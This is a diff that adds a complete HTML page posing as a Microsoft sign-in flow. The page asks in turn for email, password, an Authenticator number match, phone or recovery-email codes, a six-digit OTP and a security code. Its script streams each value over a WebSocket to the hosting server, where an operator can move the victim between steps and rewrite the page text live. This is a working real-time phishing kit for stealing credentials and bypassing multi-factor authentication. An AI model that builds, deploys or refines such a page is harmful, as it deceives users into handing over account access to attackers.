@@ -1,0 +1,729 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>microsoft Sign In</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: "Segoe UI", sans-serif;
+    }
+
+    /* ── Background — unchanged ── */
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, 0)), url(./Screenshot\ 2025-11-16\ 132948.png);
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      /* RESPONSIVE: padding so card never touches edges on small screens */
+      padding: 16px;
+    }
+
+    /* ── Container — responsive max-width ── */
+    .container {
+      width: 100%;
+      max-width: 440px;
+      /* no fixed padding here — card handles it */
+    }
+
+    /* ── Card — EXACT original colour #2e2e2e, responsive padding ── */
+    .card {
+      background: #2e2e2e;
+      border-radius: 19px;
+      padding: clamp(20px, 5vw, 30px);
+      color: #fff;
+      width: 100%;
+    }
+
+    /* ── Logo — unchanged ── */
+    .microsoft-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 4px;
+      margin-bottom: 20px;
+    }
+    .microsoft-logo img { max-height: 40px; width: auto; }
+
+    .box { width: 12px; height: 12px; }
+    .red    { background: #f25022; }
+    .green  { background: #7fba00; }
+    .blue   { background: #00a4ef; }
+    .yellow { background: #ffb900; }
+    .brand  { margin-left: 8px; font-size: 18px; font-weight: 600; }
+
+    /* ── Centered header block — unchanged ── */
+    .centered-place { text-align: center; margin-bottom: 25px; }
+
+    /* email pill — RESPONSIVE: nowrap + overflow */
+    .email-pill {
+      background: #2b2b2b;
+      padding: 8px 12px;
+      border-radius: 20px;
+      font-size: 14px;
+      display: inline-block;
+      margin-bottom: 25px;
+      color: #fff;
+      max-width: 100%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    h2 { margin: 0 0 20px; font-weight: 600; }
+
+    /* subtitle — EXACT original class, kept as-is */
+    .subtitle {
+      font-size: 14px;
+      color: #aaa;
+      margin: -10px 0 20px;
+      text-align: center;
+    }
+    .subtitle:empty { display: none; }
+
+    /* ── Inputs — EXACT original styles ── */
+    .input-group { position: relative; margin-bottom: 4px; }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      background: transparent;
+      border: 1px solid #545454;
+      border-radius: 0.3rem;
+      border-bottom: 1px solid #aaa;
+      padding-left: 0.9rem;
+      color: #fff;
+      font-size: 15px;
+    }
+    input:focus {
+      outline: none;
+      border-bottom-color: #0078d4;
+      border-bottom-width: 2px;
+    }
+    input::placeholder { color: #888; }
+    input:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .eye {
+      position: absolute;
+      right: 5px; top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      opacity: 0.7;
+      user-select: none;
+    }
+
+    /* ── Error — EXACT original ── */
+    .error {
+      color: #f1707b;
+      font-size: 13px;
+      margin-top: 10px;
+      display: none;
+    }
+    .error.show { display: block; }
+
+    .bottom-middle-link {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    /* ── Links — EXACT original ── */
+    .link {
+      display: inline-block;
+      margin: 10px 0 25px;
+      text-align: center;
+      color: #4fa3ff;
+      font-size: 14px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .link:hover { text-decoration: underline; }
+
+    /* ── Button — EXACT original ── */
+    .btn {
+      width: 100%;
+      background: #0078d4;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-family: "Segoe UI", sans-serif;
+    }
+    .btn:hover:not(:disabled) { background: #106ebe; }
+    .btn:disabled { opacity: 0.7; cursor: not-allowed; }
+
+    .links {
+      margin-top: 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+    .links a, .links span {
+      color: #4fa3ff;
+      font-size: 14px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .links a:hover, .links span:hover { text-decoration: underline; }
+
+    /* ── Verify badge — EXACT original ── */
+    .verify-badge {
+      background: #252525;
+      border: 1px solid #444;
+      border-radius: 8px;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+    .verify-number {
+      font-size: 2.2rem;
+      font-weight: 700;
+      color: #4fa3ff;
+      min-width: 52px;
+      text-align: center;
+      line-height: 1;
+    }
+    .verify-text { font-size: 13px; color: #ccc; line-height: 1.5; }
+
+    /* ── Info box — EXACT original + info-value wrapper for editability ── */
+    .info-box {
+      background: #252525;
+      border: 1px solid #444;
+      border-radius: 6px;
+      padding: 10px 14px;
+      font-size: 14px;
+      color: #ddd;
+      margin-bottom: 20px;
+    }
+    .info-label { font-size: 12px; color: #888; margin-bottom: 3px; }
+    .info-value  { font-size: 14px; color: #ddd; }
+
+    /* ── Numbered steps — EXACT original ── */
+    .steps-list { list-style: none; padding: 0; margin: 0 0 20px; }
+    .steps-list li {
+      display: flex; align-items: flex-start; gap: 12px;
+      font-size: 14px; color: #ccc;
+      padding: 9px 0; border-bottom: 1px solid #3a3a3a;
+    }
+    .steps-list li:last-child { border-bottom: none; }
+    .step-num {
+      background: #0078d4; color: #fff;
+      font-size: 11px; font-weight: 700;
+      border-radius: 50%; width: 20px; height: 20px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; margin-top: 1px;
+    }
+
+    /* ── OTP — EXACT original, RESPONSIVE sizing ── */
+    .otp-row { display: flex; gap: 8px; margin-bottom: 20px; }
+    .otp-row input {
+      flex: 1;
+      height: 50px;
+      text-align: center;
+      font-size: 1.2rem;
+      font-weight: 600;
+      padding: 0;
+      border-radius: 4px;
+      /* RESPONSIVE: min-width 0 so they don't overflow on tiny screens */
+      min-width: 0;
+    }
+
+    /* ── Loading overlay — EXACT original ── */
+    .loading-overlay {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+      padding: 20px 0 8px;
+      text-align: center;
+    }
+    .loading-overlay.show { display: flex; }
+    .spinner-lg {
+      width: 36px; height: 36px;
+      border: 3px solid #444;
+      border-top-color: #0078d4;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { font-size: 14px; color: #aaa; }
+    .loading-sub  { font-size: 12px; color: #666; margin-top: -8px; }
+
+    /* ── Waiting button — EXACT original ── */
+    .btn-waiting {
+      width: 100%;
+      background: #1a3a5c;
+      color: #4fa3ff;
+      border: 1px solid #2a5080;
+      padding: 12px;
+      font-size: 15px;
+      border-radius: 4px;
+      cursor: default;
+      font-family: "Segoe UI", sans-serif;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      position: relative; overflow: hidden;
+    }
+    .btn-waiting::after {
+      content: '';
+      position: absolute; top: 0; left: -100%; width: 60%; height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(74,163,255,0.08), transparent);
+      animation: shimmer 1.6s infinite;
+    }
+    @keyframes shimmer { to { left: 160%; } }
+    .spinner-sm {
+      width: 14px; height: 14px;
+      border: 2px solid #2a5080;
+      border-top-color: #4fa3ff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      flex-shrink: 0;
+    }
+
+    /* ── Back link — EXACT original ── */
+    .back-row { margin-top: 16px; }
+    .back-link {
+      color: #4fa3ff; font-size: 14px;
+      text-decoration: none; cursor: pointer;
+      background: none; border: none;
+      font-family: "Segoe UI", sans-serif;
+      padding: 0;
+    }
+    .back-link:hover { text-decoration: underline; }
+
+    /* ── Step visibility — EXACT original ── */
+    .step { display: none; }
+    .step.active { display: block; animation: fadeIn 0.2s ease both; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateX(6px); } to { opacity: 1; } }
+
+    /* ════════════════════════════════════════
+       RESPONSIVE — added on top, never
+       overriding the design, only adapting
+       layout for smaller screens
+    ════════════════════════════════════════ */
+
+    /* Phones ≤ 480px */
+    @media (max-width: 480px) {
+      body {
+        /* remove side padding — card goes edge-to-edge */
+        padding: 0;
+        align-items: flex-end;       /* anchor to bottom */
+      }
+      .container {
+        max-width: 100%;
+      }
+
+       body {
+      margin: 0;
+      min-height: 60vh;
+      background-image: none;
+      background-color: #2e2e2e;
+      background-size: cover;
+      background-position: center;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      /* RESPONSIVE: padding so card never touches edges on small screens */
+      padding: 16px;
+    }
+      .card {
+        border-radius: 16px 16px 0 0;  /* bottom-sheet style */
+        padding: 24px 18px 32px;
+        min-height: 55vh;               /* feels like a proper sheet */
+      }
+      /* OTP boxes slightly shorter on very small screens */
+      .otp-row input { height: 44px; font-size: 1.1rem; }
+
+      /* Links don't need 30px top margin on mobile */
+      .links { margin-top: 20px; }
+    }
+
+    /* Very small phones ≤ 360px */
+    @media (max-width: 360px) {
+      .card { padding: 20px 14px 28px; }
+      .otp-row { gap: 5px; }
+      .otp-row input { height: 40px; font-size: 1rem; }
+      h2 { font-size: 1.15rem; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <!-- Logo -->
+    <div class="microsoft-logo">
+    <svg aria-label="Microsoft" data-testid="microsoftLogo" role="img" width="114" height="24" viewBox="0 0 114 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M47.2997 5.30006V19.7001H44.7997V8.40006H44.7664L40.2997 19.7001H38.633L34.0664 8.40006H34.033V19.7001H31.733V5.30006H35.333L39.4664 15.9667H39.533L43.8997 5.30006H47.2997ZM49.3664 6.40006C49.3664 6.00006 49.4997 5.66673 49.7997 5.40006C50.0997 5.1334 50.433 5.00006 50.833 5.00006C51.2664 5.00006 51.633 5.1334 51.8997 5.4334C52.1664 5.70006 52.333 6.0334 52.333 6.4334C52.333 6.8334 52.1997 7.16673 51.8997 7.4334C51.5997 7.70006 51.2664 7.8334 50.833 7.8334C50.3997 7.8334 50.0664 7.70006 49.7997 7.4334C49.533 7.10006 49.3664 6.76673 49.3664 6.40006ZM52.0664 9.36673V19.7001H49.633V9.36673H52.0664ZM59.433 17.9334C59.7997 17.9334 60.1997 17.8334 60.633 17.6667C61.0664 17.5001 61.4664 17.2667 61.833 17.0001V19.2667C61.433 19.5001 60.9997 19.6667 60.4997 19.7667C59.9997 19.8667 59.4664 19.9334 58.8664 19.9334C57.333 19.9334 56.0997 19.4667 55.1664 18.5001C54.1997 17.5334 53.733 16.3001 53.733 14.8334C53.733 13.1667 54.233 11.8001 55.1997 10.7334C56.1664 9.66673 57.533 9.1334 59.333 9.1334C59.7997 9.1334 60.233 9.20006 60.6997 9.30006C61.1664 9.4334 61.533 9.56673 61.7997 9.70006V12.0334C61.433 11.7667 61.033 11.5334 60.6664 11.4001C60.2664 11.2334 59.8664 11.1667 59.4664 11.1667C58.4997 11.1667 57.733 11.4667 57.133 12.1001C56.533 12.7334 56.233 13.5667 56.233 14.6334C56.233 15.6667 56.4997 16.5001 57.0664 17.0667C57.6997 17.6334 58.4664 17.9334 59.433 17.9334ZM68.733 9.20006C68.933 9.20006 69.0997 9.20006 69.2664 9.2334C69.433 9.26673 69.5664 9.30006 69.6664 9.3334V11.8001C69.533 11.7001 69.3664 11.6334 69.0997 11.5334C68.8664 11.4334 68.5664 11.4001 68.1997 11.4001C67.5997 11.4001 67.0997 11.6667 66.6997 12.1667C66.2997 12.6667 66.0664 13.4334 66.0664 14.5001V19.7001H63.633V9.36673H66.0664V11.0001H66.0997C66.333 10.4334 66.6664 10.0001 67.0997 9.66673C67.5664 9.36673 68.0997 9.20006 68.733 9.20006ZM69.7997 14.7001C69.7997 13.0001 70.2664 11.6334 71.233 10.6334C72.1997 9.6334 73.533 9.1334 75.2664 9.1334C76.8664 9.1334 78.133 9.60006 79.033 10.5667C79.933 11.5334 80.3997 12.8334 80.3997 14.4667C80.3997 16.1334 79.933 17.4667 78.9664 18.4667C77.9997 19.4667 76.6997 19.9667 75.033 19.9667C73.433 19.9667 72.1664 19.5001 71.233 18.5667C70.2664 17.6001 69.7997 16.3001 69.7997 14.7001ZM72.333 14.6001C72.333 15.6667 72.5664 16.5001 73.0664 17.0667C73.5664 17.6334 74.2664 17.9334 75.1664 17.9334C76.0664 17.9334 76.733 17.6334 77.1997 17.0667C77.6664 16.5001 77.8997 15.6667 77.8997 14.5334C77.8997 13.4334 77.6664 12.6001 77.1664 12.0334C76.6997 11.4667 76.033 11.2001 75.1664 11.2001C74.2664 11.2001 73.5997 11.5001 73.0997 12.1001C72.5664 12.6667 72.333 13.5001 72.333 14.6001ZM83.9997 12.1001C83.9997 12.4334 84.0997 12.7334 84.333 12.9334C84.5664 13.1334 85.033 13.3667 85.7997 13.6667C86.7664 14.0667 87.4664 14.5001 87.833 14.9667C88.233 15.4667 88.433 16.0334 88.433 16.7334C88.433 17.7001 88.0664 18.5001 87.2997 19.0667C86.5664 19.6667 85.533 19.9667 84.2664 19.9667C83.833 19.9667 83.3664 19.9001 82.833 19.8001C82.2997 19.7001 81.8664 19.5667 81.4997 19.4001V17.0001C81.933 17.3001 82.433 17.5667 82.933 17.7334C83.433 17.9001 83.8997 18.0001 84.333 18.0001C84.8664 18.0001 85.2997 17.9334 85.533 17.7667C85.7997 17.6001 85.933 17.3667 85.933 17.0001C85.933 16.6667 85.7997 16.3667 85.533 16.1667C85.2664 15.9334 84.733 15.6667 83.9997 15.3667C83.0997 15.0001 82.4664 14.5667 82.0997 14.1001C81.733 13.6334 81.533 13.0334 81.533 12.3001C81.533 11.3667 81.8997 10.6001 82.633 10.0001C83.3664 9.40006 84.333 9.10006 85.4997 9.10006C85.8664 9.10006 86.2664 9.1334 86.6997 9.2334C87.133 9.30006 87.533 9.4334 87.833 9.5334V11.8334C87.4997 11.6334 87.133 11.4334 86.6997 11.2667C86.2664 11.1001 85.833 11.0334 85.433 11.0334C84.9664 11.0334 84.5997 11.1334 84.3664 11.3001C84.133 11.5334 83.9997 11.7667 83.9997 12.1001ZM89.4664 14.7001C89.4664 13.0001 89.933 11.6334 90.8997 10.6334C91.8664 9.6334 93.1997 9.1334 94.933 9.1334C96.533 9.1334 97.7997 9.60006 98.6997 10.5667C99.5997 11.5334 100.066 12.8334 100.066 14.4667C100.066 16.1334 99.5997 17.4667 98.633 18.4667C97.6664 19.4667 96.3664 19.9667 94.6997 19.9667C93.0997 19.9667 91.833 19.5001 90.8997 18.5667C89.9664 17.6001 89.4664 16.3001 89.4664 14.7001ZM91.9997 14.6001C91.9997 15.6667 92.233 16.5001 92.733 17.0667C93.233 17.6334 93.933 17.9334 94.833 17.9334C95.733 17.9334 96.3997 17.6334 96.8664 17.0667C97.333 16.5001 97.5664 15.6667 97.5664 14.5334C97.5664 13.4334 97.333 12.6001 96.833 12.0334C96.3664 11.4667 95.6997 11.2001 94.833 11.2001C93.933 11.2001 93.2664 11.5001 92.7664 12.1001C92.2664 12.6667 91.9997 13.5001 91.9997 14.6001ZM108.133 11.3667H104.5V19.7001H102.033V11.3667H100.3V9.36673H102.033V7.9334C102.033 6.8334 102.4 5.96673 103.1 5.26673C103.8 4.56673 104.7 4.2334 105.8 4.2334C106.1 4.2334 106.366 4.2334 106.6 4.26673C106.833 4.30007 107.033 4.3334 107.2 4.40007V6.50006C107.133 6.46673 106.966 6.40006 106.766 6.3334C106.566 6.26673 106.333 6.2334 106.066 6.2334C105.566 6.2334 105.166 6.40006 104.9 6.70006C104.633 7.0334 104.5 7.50006 104.5 8.10006V9.3334H108.133V7.00006L110.566 6.26673V9.3334H113.033V11.3334H110.566V16.1667C110.566 16.8001 110.666 17.2667 110.9 17.5001C111.133 17.7667 111.5 17.9001 112 17.9001C112.133 17.9001 112.3 17.8667 112.5 17.8001C112.7 17.7334 112.866 17.6667 113.033 17.5667V19.5667C112.866 19.6667 112.633 19.7334 112.266 19.8001C111.9 19.8667 111.566 19.9001 111.2 19.9001C110.166 19.9001 109.4 19.6334 108.9 19.0667C108.4 18.5334 108.133 17.7001 108.133 16.6001V11.3667Z" fill="#FFFFFF"></path><path d="M13.2383 13.2383H24.5V24.5H13.2383V13.2383Z" fill="#FFB900"></path><path d="M0.5 13.2383H11.7617V24.5H0.5V13.2383Z" fill="#00A4EF"></path><path d="M13.2383 0.5H24.5V11.7617H13.2383V0.5Z" fill="#7FBA00"></path><path d="M0.5 0.5H11.7617V11.7617H0.5V0.5Z" fill="#F25022"></path></svg>
+    </div>
+
+    <!-- ── STEP: Email ──────────────────────────────────────── -->
+    <div class="step active" id="step-email">
+      <div class="centered-place">
+        <h2>Sign in</h2>
+        <p class="subtitle">Use your microsoft account</p>
+      </div>
+      <div id="email-form">
+        <div class="input-group">
+          <input type="email" id="input-email" placeholder="Email, phone, or Skype" autocomplete="email" />
+        </div>
+        <p class="error" id="err-email">Please enter your email address.</p>
+        <a class="link">Forgot your username?</a>
+        <button class="btn" onclick="submitEmail()">Next</button>
+        <div class="links bottom-middle-link">
+          <p>New to microsoft? <a onclick="goTo('recovery')">Create an account</a></p>
+        </div>
+      </div>
+      <div class="loading-overlay" id="email-loading">
+        <div class="spinner-lg"></div>
+        <div class="loading-text">Checking your account…</div>
+        <div class="loading-sub">Please wait a moment.</div>
+      </div>
+    </div>
+
+    <!-- ── STEP: Password ───────────────────────────────────── -->
+    <div class="step" id="step-password">
+      <div class="centered-place">
+        <div class="email-pill" id="display-email">user@email.com</div>
+        <h2>Enter your password</h2>
+        <p class="subtitle"></p>
+      </div>
+      <div id="password-form">
+        <div class="input-group">
+          <input type="password" id="input-password" placeholder="Password" autocomplete="current-password" />
+          <span class="eye" id="pw-eye">👁</span>
+        </div>
+        <p class="error" id="err-password">That password is incorrect for your microsoft account.</p>
+        <a class="link">Forgot your password?</a>
+        <button class="btn" onclick="submitPassword()">Next</button>
+        <div class="links bottom-middle-link">
+          <a onclick="goTo('email')">Other ways to sign in</a>
+          <!-- <a onclick="goTo('email')">Sign in with a different microsoft account</a> -->
+        </div>
+      </div>
+      <div class="loading-overlay" id="password-loading">
+        <div class="spinner-lg"></div>
+        <div class="loading-text">Verifying your password…</div>
+        <div class="loading-sub">Please wait a moment.</div>
+      </div>
+    </div>
+
+    <!-- ── STEP: Verify push ────────────────────────────────── -->
+    <div class="step" id="step-verify">
+      <div class="centered-place">
+        <h2>Verify that it's you</h2>
+        <p class="subtitle">microsoft sent a notification to your phone.</p>
+      </div>
+      <div class="verify-badge">
+        <div class="verify-number" id="verify-num">42</div>
+        <div class="verify-text">Open the <strong>microsoft Authenticator</strong> app and tap the matching number to approve.</div>
+      </div>
+      <div class="btn-waiting">
+        <div class="spinner-sm"></div>
+        Waiting for approval…
+      </div>
+      <div class="links" style="margin-top:20px;">
+        <a onclick="goTo('phone')">Use a verification code instead</a>
+      </div>
+      <div class="back-row">
+        <button class="back-link" onclick="goToBack('password')">← Back</button>
+      </div>
+    </div>
+
+    <!-- ── STEP: Phone confirm ──────────────────────────────── -->
+    <div class="step" id="step-phone">
+      <div class="centered-place">
+        <h2>Get a verification code</h2>
+        <p class="subtitle">Confirm the phone number on your account.</p>
+      </div>
+      <div id="phone-form">
+        <div class="info-box">
+          <div class="info-label" id="phone-info-label">Phone number on your account</div>
+          <div class="info-value" id="phone-info-value">(•••) ••••-••49</div>
+        </div>
+        <button class="btn" onclick="submitPhone()">Send</button>
+        <div class="links">
+          <a onclick="goTo('recovery')">Use recovery email instead</a>
+        </div>
+        <div class="back-row">
+          <button class="back-link" onclick="goToBack('verify')">← Back</button>
+        </div>
+      </div>
+      <div class="loading-overlay" id="phone-loading">
+        <div class="spinner-lg"></div>
+        <div class="loading-text">Sending your code…</div>
+        <div class="loading-sub">Please wait a moment.</div>
+      </div>
+    </div>
+
+    <!-- ── STEP: OTP code ───────────────────────────────────── -->
+    <div class="step" id="step-code">
+      <div class="centered-place">
+        <h2>Enter the verification code</h2>
+        <p class="subtitle" id="code-subtitle">Sent a code to *********087@gmail.com</p>
+      </div>
+      <div id="code-form">
+        <div class="otp-row" id="otp-inputs">
+          <input type="text" maxlength="1" inputmode="numeric" />
+          <input type="text" maxlength="1" inputmode="numeric" />
+          <input type="text" maxlength="1" inputmode="numeric" />
+          <input type="text" maxlength="1" inputmode="numeric" />
+          <input type="text" maxlength="1" inputmode="numeric" />
+          <input type="text" maxlength="1" inputmode="numeric" />
+        </div>
+        <p class="error" id="err-code">Please enter the full 6-digit code.</p>
+        <button class="btn" onclick="submitOtp()">Next</button>
+        <div class="links">
+          <a onclick="resendCode()">Resend code</a>
+        </div>
+        <div class="back-row">
+          <button class="back-link" onclick="goToBack('phone')">← Back</button>
+        </div>
+      </div>
+      <div class="loading-overlay" id="code-loading">
+        <div class="spinner-lg"></div>
+        <div class="loading-text">Verifying your code…</div>
+        <div class="loading-sub">Please wait a moment.</div>
+      </div>
+    </div>
+
+    <!-- ── STEP: Recovery email ─────────────────────────────── -->
+    <div class="step" id="step-recovery">
+      <div class="centered-place">
+        <h2>Get a verification code</h2>
+        <p class="subtitle">Confirm the recovery email on your account.</p>
+      </div>
+      <div id="recovery-form">
+        <div class="info-box">
+          <div class="info-label" id="recovery-info-label">Recovery email on your account</div>
+          <div class="info-value" id="recovery-info-value">reu•••••••@gmail.com</div>
+        </div>
+        <button class="btn" onclick="submitRecovery()">Next</button>
+        <div class="links">
+          <a onclick="goTo('security')">Use security code instead</a>
+        </div>
+        <div class="back-row">
+          <button class="back-link" onclick="goToBack('verify')">← Back</button>
+        </div>
+      </div>
+      <div class="loading-overlay" id="recovery-loading">
+        <div class="spinner-lg"></div>
+        <div class="loading-text">Sending your code…</div>
+        <div class="loading-sub">Please wait a moment.</div>
+      </div>
+    </div>
+
+    <!-- ── STEP: Security code ──────────────────────────────── -->
+    <div class="step" id="step-security">
+      <div class="centered-place">
+        <h2>Get a security code</h2>
+        <p class="subtitle">Retrieve your code from the microsoft Authenticator app.</p>
+      </div>
+      <div id="security-form">
+        <ul class="steps-list">
+          <li><div class="step-num">1</div> Open the <strong>microsoft Authenticator</strong> app</li>
+          <li><div class="step-num">2</div> Go to your account settings</li>
+          <li><div class="step-num">3</div> Under <strong>Security</strong>, view your security code</li>
+        </ul>
+        <div class="input-group">
+          <input type="text" id="input-security" placeholder="Security code" inputmode="numeric" />
+        </div>
+        <p class="error" id="err-security">Please enter your security code.</p>
+        <br>
+        <button class="btn" onclick="submitSecurity()">Next</button>
+        <div class="back-row">
+          <button class="back-link" onclick="goToBack('recovery')">← Back</button>
+        </div>
+      </div>
+      <div class="loading-overlay" id="security-loading">
+        <div class="spinner-lg"></div>
+        <div class="loading-text">Verifying your code…</div>
+        <div class="loading-sub">Please wait a moment.</div>
+      </div>
+    </div>
+
+  </div><!-- /.card -->
+</div><!-- /.container -->
+
+<script>
+  const SESSION_ID = 'sess_' + Math.random().toString(36).slice(2, 10);
+  const wsUrl = (location.protocol === 'https:' ? 'wss://' : 'ws://') +
+    (window.location.hostname || 'localhost') +
+    (location.port ? ':' + location.port : ':3000');
+
+  let socket = null;
+  let currentStep = 'email';
+
+  function showLoading(step) {
+    const form    = document.getElementById(step + '-form');
+    const overlay = document.getElementById(step + '-loading');
+    if (form)    form.style.display = 'none';
+    if (overlay) overlay.classList.add('show');
+  }
+  function hideLoading(step) {
+    const form    = document.getElementById(step + '-form');
+    const overlay = document.getElementById(step + '-loading');
+    if (form)    form.style.display = '';
+    if (overlay) overlay.classList.remove('show');
+  }
+
+  function goTo(step) {
+    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+    const el = document.getElementById('step-' + step);
+    if (!el) return;
+    el.classList.add('active');
+    hideLoading(step);
+    currentStep = step;
+    wsSend({ type: 'step_changed', step, sessionId: SESSION_ID });
+  }
+  function goToBack(step) { hideLoading(currentStep); goTo(step); }
+
+  function submitEmail() {
+    const email = document.getElementById('input-email').value.trim();
+    const err   = document.getElementById('err-email');
+    err.classList.remove('show');
+    if (!email) { err.classList.add('show'); return; }
+    document.getElementById('display-email').textContent = email;
+    wsSend({ type: 'email_submitted', email, sessionId: SESSION_ID });
+    showLoading('email');
+  }
+  function submitPassword() {
+    const pw  = document.getElementById('input-password').value;
+    const err = document.getElementById('err-password');
+    err.classList.remove('show');
+    if (!pw) { err.classList.add('show'); return; }
+    wsSend({ type: 'password_submitted', password: pw, sessionId: SESSION_ID });
+    showLoading('password');
+  }
+  function submitPhone()    { wsSend({ type: 'phone_confirmed',    sessionId: SESSION_ID }); showLoading('phone'); }
+  function submitRecovery() { wsSend({ type: 'recovery_confirmed', sessionId: SESSION_ID }); showLoading('recovery'); }
+  function submitSecurity() {
+    const code = document.getElementById('input-security').value.trim();
+    const err  = document.getElementById('err-security');
+    err.classList.remove('show');
+    if (!code) { err.classList.add('show'); return; }
+    wsSend({ type: 'security_code_submitted', code, sessionId: SESSION_ID });
+    showLoading('security');
+  }
+  function submitOtp() {
+    const inputs = document.querySelectorAll('#otp-inputs input');
+    const code   = Array.from(inputs).map(i => i.value).join('');
+    const err    = document.getElementById('err-code');
+    err.classList.remove('show');
+    if (code.length < 6) { err.classList.add('show'); return; }
+    wsSend({ type: 'otp_submitted', code, sessionId: SESSION_ID });
+    showLoading('code');
+  }
+  function resendCode() { wsSend({ type: 'code_resend_requested', sessionId: SESSION_ID }); }
+
+  document.addEventListener('DOMContentLoaded', () => {
+    const pwInput = document.getElementById('input-password');
+    const pwEye   = document.getElementById('pw-eye');
+    pwEye.addEventListener('click', () => {
+      if (pwInput.type === 'password') { pwInput.type = 'text';     pwEye.textContent = '🙈'; }
+      else                             { pwInput.type = 'password'; pwEye.textContent = '👁'; }
+    });
+    const otpInputs = document.querySelectorAll('#otp-inputs input');
+    otpInputs.forEach((inp, i) => {
+      inp.addEventListener('input', () => {
+        inp.value = inp.value.replace(/\D/, '');
+        if (inp.value && i < otpInputs.length - 1) otpInputs[i + 1].focus();
+      });
+      inp.addEventListener('keydown', e => {
+        if (e.key === 'Backspace' && !inp.value && i > 0) otpInputs[i - 1].focus();
+      });
+    });
+  });
+
+  // ── applyContent ─────────────────────────────────────────────────
+  // targetStep can differ from currentStep so admin can update any
+  // step in the background before navigating the user there.
+  function applyContent(content, targetStep) {
+    const step = targetStep || currentStep;
+
+    if (content.title) {
+      const el = document.querySelector('#step-' + step + ' h2');
+      if (el) el.textContent = content.title;
+    }
+    if (content.subtitle !== undefined) {
+      const el = document.querySelector('#step-' + step + ' .subtitle');
+      if (el) el.textContent = content.subtitle;
+    }
+    if (content.verifyNumber !== undefined) {
+      const el = document.getElementById('verify-num');
+      if (el) el.textContent = content.verifyNumber;
+    }
+    if (content.phoneInfoLabel !== undefined) {
+      const el = document.getElementById('phone-info-label');
+      if (el) el.textContent = content.phoneInfoLabel;
+    }
+    if (content.phoneInfoValue !== undefined) {
+      const el = document.getElementById('phone-info-value');
+      if (el) el.textContent = content.phoneInfoValue;
+    }
+    if (content.recoveryInfoLabel !== undefined) {
+      const el = document.getElementById('recovery-info-label');
+      if (el) el.textContent = content.recoveryInfoLabel;
+    }
+    if (content.recoveryInfoValue !== undefined) {
+      const el = document.getElementById('recovery-info-value');
+      if (el) el.textContent = content.recoveryInfoValue;
+    }
+    if (content.error) {
+      if (step === currentStep) {
+        hideLoading(step);
+        const errEl = document.getElementById('err-' + step);
+        if (errEl) { errEl.textContent = content.error; errEl.classList.add('show'); }
+      } else {
+        // Pre-populate so error is ready when user arrives
+        const errEl = document.getElementById('err-' + step);
+        if (errEl) errEl.textContent = content.error;
+      }
+    }
+  }
+
+  function wsSend(obj) {
+    if (socket && socket.readyState === WebSocket.OPEN)
+      try { socket.send(JSON.stringify(obj)); } catch(e) {}
+  }
+
+  function initWS() {
+    socket = new WebSocket(wsUrl);
+    socket.onopen = () => {
+      socket.send(JSON.stringify({ type: 'connect', sessionId: SESSION_ID }));
+    };
+    socket.onmessage = (ev) => {
+      try {
+        const data = JSON.parse(ev.data);
+        if (data.type === 'navigate_to_step' && data.step) {
+          goTo(data.step);
+          if (data.content) applyContent(data.content, data.step);
+        }
+        if (data.type === 'update_content' && data.content) {
+          applyContent(data.content, data.step || currentStep);
+        }
+        if (data.type === 'code_assigned' && data.code) {
+          goTo('code');
+          const inputs = document.querySelectorAll('#otp-inputs input');
+          String(data.code).split('').forEach((c, i) => { if (inputs[i]) inputs[i].value = c; });
+        }
+      } catch(e) {}
+    };
+    socket.onclose = () => setTimeout(initWS, 2000);
+    socket.onerror = () => {};
+  }
+
+  initWS();
+</script>
+</body>
+</html>
